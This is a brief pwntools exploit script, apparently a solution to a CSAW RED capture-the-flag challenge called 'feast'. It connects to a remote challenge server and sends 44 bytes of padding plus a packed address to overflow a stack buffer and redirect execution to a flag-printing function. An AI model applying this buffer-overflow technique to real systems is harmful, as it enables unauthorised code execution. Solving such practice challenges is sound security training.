from pwn import *
import sys

REMOTE = True
GDB = False

BINARY = './feast'
MAIN = 0x804861e
FLAG = 0x8048586 


if REMOTE:
    p = remote('pwn.red.csaw.io', 5001)
elif GDB:
    p = gdb.debug(BINARY, 'b main')
else:
    p = process(BINARY)

junk = ("A" * 44).encode()
call = p32(FLAG)


p.recvuntil("There's a delicious dinner waiting for you, if you can get to it!")
p.sendline(junk + call)
p.interactive()

